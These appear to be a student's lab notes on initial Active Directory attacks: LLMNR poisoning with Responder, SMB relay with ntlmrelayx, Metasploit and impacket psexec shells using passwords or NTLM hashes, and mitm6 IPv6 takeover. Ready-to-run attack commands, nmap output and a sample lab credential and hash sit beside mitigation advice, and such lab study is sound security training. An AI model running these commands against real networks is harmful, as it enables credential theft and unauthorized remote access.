# Introduction
**Initial AD attack vectors** in Active Directory involve identifying weaknesses that can provide an entry point into the domain environment, such as exposed services, weak credentials, misconfigurations, phishing, or vulnerable applications. These footholds can enable credential access, privilege escalation, and lateral movement within the domain.

# LLMNR Poisoning
**LLMNR** poisoning exploits the **LLMNR** (**Link-Local Multicast Name Resolution**) protocol by responding to broadcast name-resolution requests with an attacker-controlled IP address. This can capture NetNTLMv2 challenge-response hashes, which may be cracked offline or relayed to other systems to gain unauthorized access.
> Previously it was known to be NBT-NS. Though in some systems you can see NBT-NS to be found.

Key flaw : Services utilize a user's username and NTLMv2 hash when appropriately responded to.

Methodology (Overview) :
1. Run Responder
> Since we are simulating this attack. So....
2. An event occurs...
	We will try to navigate or point to a file share which will be at the attacker ip address
3. Get dem hashes (in on-going responder session)
4. Try cracking the hashes (GPU required) `hashcat -m 5600 hashes.txt rockyou.txt`

#### Capturing Hashes with Responder -
Hands-on :
1. start responder: `responder -I eth0 -dwv`
2. `On ElliotA` navigate or point to a file share (here `atckr-ip`) from the File-exp URL
	`\\atckr-ip`
3. Check the Events of your responder
4. Hashes Found....

![[NTLMv2-Hashes.png]]

Cracking The Captured Hashes:
1. Put the hashes in the ntlmhash.txt (`EAlderson::ECORP:16771bf7....0000`)
2. run (base-os): `hashcat -m 5600 ntlmhash.txt rockyou.txt -O`
> Base-os with GPU

#### LLMNR Poisoning Mitigation (remediation) -
The best defense in this case is to disable LLMNR and NBT-NS.
- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under...
	`Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor`.
- To disable NBT-NS, navigate to `Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP"`.

If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
- Require Network Access Control
- Require strong user passwords (e.g., >14 characters and limit common word usage). The more complex and long the password, the harder it is for an attacker to crack the hash.

# SMB Relay Attacks
SMB relay attacks intercept **NetNTLM authentication exchanges** and forward them to another SMB server to impersonate a legitimate user without cracking their password. If **SMB signing is disabled** and other conditions permit, attackers can authenticate to target systems and potentially access resources or execute commands using the victim's privileges.

Requirements:
- SMB signing (packet-level protocol) must be disabled on the target
- Relayed user credentials must be admin on machine (`local administrator`)

Methodology (Overview) :
1. Identify Hosts with SMB Signing Disabled
	nessus scan, nmap (w/ built-in script), or browse for "SMB signing check tool"
2. Turn Off - > SMB HTTP in `Responder.conf` 
	turn off SMB HTTP in : `/etc/responder/Responder.conf`
3. Run Responder
4. Set up your relay (configure ntlmrelayx, specify targets)
5. An Event Occurs...
6. Hashes Found...

#### Capturing Hashes with SMB Relay Attack
Hands-on :
1. Identify Hosts with SMB Signing Disabled
	nessus scan, nmap (w/ built-in script), or browse for "SMB signing check tool"
	Here: `nmap --script=smb2-security-mode.nse -p 445 <net-ip-cidr>`


| Evil Corp (DC)                                                                                                                                                                                                                                                                                                             | Elliot Alderson (DU-1)                                                                                                                                                                                                                                                                                                          | Darlene Alderson (DU-1)                                                                                                                                                                                                                                                                                                           |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Nmap scan report for EvilCorp-DC (192.168.122.173)<br>Host is up (0.00030s latency).<br><br>PORT    STATE SERVICE<br>445/tcp open  microsoft-ds<br>MAC Address: 52:54:00:FC:43:AD (QEMU virtual NIC)<br><br>Host script results:<br>\| smb2-security-mode: <br>\|   3.1.1: <br>\|_    Message signing enabled and required | Nmap scan report for ElliotA (192.168.122.11)<br>Host is up (0.00057s latency).<br><br>PORT    STATE SERVICE<br>445/tcp open  microsoft-ds<br>MAC Address: 52:54:00:4B:2D:62 (QEMU virtual NIC)<br><br>Host script results:<br>\| smb2-security-mode: <br>\|   3.1.1: <br>\|_    ==🟠Message signing enabled but not required== | Nmap scan report for DarleneA (192.168.122.164)<br>Host is up (0.00088s latency).<br><br>PORT    STATE SERVICE<br>445/tcp open  microsoft-ds<br>MAC Address: 52:54:00:80:41:4A (QEMU virtual NIC)<br><br>Host script results:<br>\| smb2-security-mode: <br>\|   3.1.1: <br>\|_    ==🟠Message signing enabled but not required== |

2. Turn Off - > SMB HTTP in `Responder.conf` 
	turn off SMB HTTP in : `/etc/responder/Responder.conf`
3. Shell-1 : start responder : `responder -I eth0 -dwv`
4. Shell-2 : run : `impacket-ntlmrelayx -tf targets.txt -smb2support`
	`targets.txt` = Domain User's : Windows Client : IP addresses
5. `On ElliotA` navigate or point to a file share (here `atckr-ip`) from the File-exp URL
	`\\atckr-ip`
6. Check back Shell-2
7. Hashes Found...
![[impacket-ntlmrelayx-output.png]]

> Tip 1:
> `impacket-ntlmrelayx -tf targets.txt -smb2support -i`
> This will give an interactive shell.
> ```bash
> [*] (SMB): Authenticating connection from ECORP/EALDERSON@192.168.122.11 against smb://192.168.122.164 SUCCEED [1]
> [*] smb://ECORP/EALDERSON@192.168.122.164 [1] -> Started interactive SMB client shell via TCP on 127.0.0.1:11000
> [*] All targets processed!
> ```
> We will have to Netcat to client shell `nc 127.0.0.1 11000`
> .
> Now since in shell, `shares` list the shares, `use <share>` access share, `help` for more cmds
> Tip 2:
> we can also excute commands using relay attacks via 
> `impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoam'`

#### SMB Relay Attacks Mitigation (remediation) -
Mitigation strategies:
- **Enable SMB Signing on all devices**
  - **Pro:** Completely stops the attack.
  - **Con:** Can cause performance issues with file copies.

- **Disable NTLM authentication on network**
  - **Pro:** Completely stops the attack.
  - **Con:** If Kerberos stops working, Windows defaults back to NTLM.

- **Account Tiering**
  - **Pro:** Limits domain admins to specific tasks (e.g., only log on to servers with need for DA).
  - **Con:** Enforcing the policy may be difficult.

- **Local Admin Restriction**
  - **Pro:** Can prevent a lot of lateral movement.
  - **Con:** Potential increase in the amount of service desk tickets.

# Gaining Shell Access
Obtaining an interactive command-line session on a compromised Active Directory domain-joined machine using valid credentials, exploited services, or remote execution techniques. Shell access provides an initial foothold for system enumeration, credential discovery, privilege escalation, and lateral movement within the domain.

#### Through Metasploit - with a password
> use `exploit/windows/smb/psexec`
> set payload `windows/x64/meterpreter/reverse_tcp` - as most of the systems will be x64

1. set SMBDomain <domain_>
	here: ECORP.local
2. set SMBUser <User_>
	here: EAlderson
3. set SMBPass <Password_>
	here: EA@DU443
4. run exploit
> Disclaimer:
> Windows defender and firewall might stop it
> Here, it did stop in getting the session

> Issue:
> Metasploit seems to noisy so it can get picked up in real world environment

#### Through Metasploit - with a Hash
> use `exploit/windows/smb/psexec`
> set payload `windows/x64/meterpreter/reverse_tcp` - as most of the systems will be x64

1. unset SMBDomain <domain_>
	here: ECORP.local
2. set SMBUser <local_administrator>
	here: administrator
3. set SMBPass <NTLM_hash>
	here: `aad3b435b51404eeaad3b435b51404ee:28b05f658b04a75ea881fb1124ee2f61`
	since: Administrator:500:==🟡aad3b435b51404eeaad3b435b51404ee==:==🟢28b05f658b04a75ea881fb1124ee2f61==:::
	Yellow - LM hash
	Greem - NT hash
4. run exploit
> Disclaimer:
> Windows defender and firewall might stop it
> Here, it did stop in getting the session

> Issue:
> Metasploit seems to noisy so it can get picked up in real world environment

#### Through psexec (`impacket-psexcec`) - with a password
> using `impacket-psexec`

```bash
impacket-psexec <domain>/<user>:'PassWord'@<target-ip>
# This will drop a windows shell (Command Prompt / Powershell)
```

#### Through psexec (`impacket-psexcec`) - with a hash
> using `impacket-psexec`

```bash
impacket-psexec administrator@<target-ip> -hashes <ntlmv1-hash>
# This will drop a windows shell (Command prompt / Powershel)
```

> Note: 
> We got other  tools as well like... `impacket-wmiexec` and `impacket-smbexec`
> It's just matter of which settings are Set

# IPv6 Attacks
Exploiting **misconfigured IPv6** implementations in Active Directory environments, particularly when IPv6 is enabled but not properly secured. Techniques such as **mitm6** can abuse rogue DHCPv6 responses and DNS configuration to intercept authentication requests, capture or relay NTLM credentials, and potentially compromise domain accounts.

#### IPv6 DNS Takeover via mitm6
Hands-on:
1. Shell-1 : run : `impacket-ntlmrelayx -6 -t ldaps://<target-ip> -wh fakewpad.<domain.local> -l lootme`
2. Shell-2 : run : `mitm6 -d <domain.local>` 
3. Keep these running... And reboot the target machine once

> **Con of mitm6:**
> Can cause a network outage or connectivity disruption if incorrectly configured or if the attacker-controlled DHCPv6 responses interfere with legitimate network configuration.

#### IPv6 DNS Takeover via mitm6 - Mitigation Strategies

1. **IPv6 Poisoning**
   - IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments.
   - If you do not use IPv6 internally, the safest way to prevent MITM6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy.
   - Disabling IPv6 entirely may have unwanted side effects.
   - Set the following predefined rules to **Block** instead of **Allow** to prevent the attack from working:
     - (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In)
     - (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
     - (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out)

2. **WPAD**
   - If WPAD is not in use internally, disable it via Group Policy and by disabling the `WinHttpAutoProxySvc` service.

3. **LDAP and LDAPS Relay**
   - Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.

4. **Kerberos Delegation**
   - Consider adding administrative users to the Protected Users group or marking their accounts as **Account is sensitive and cannot be delegated**.
   - This will prevent any impersonation of that user via delegation.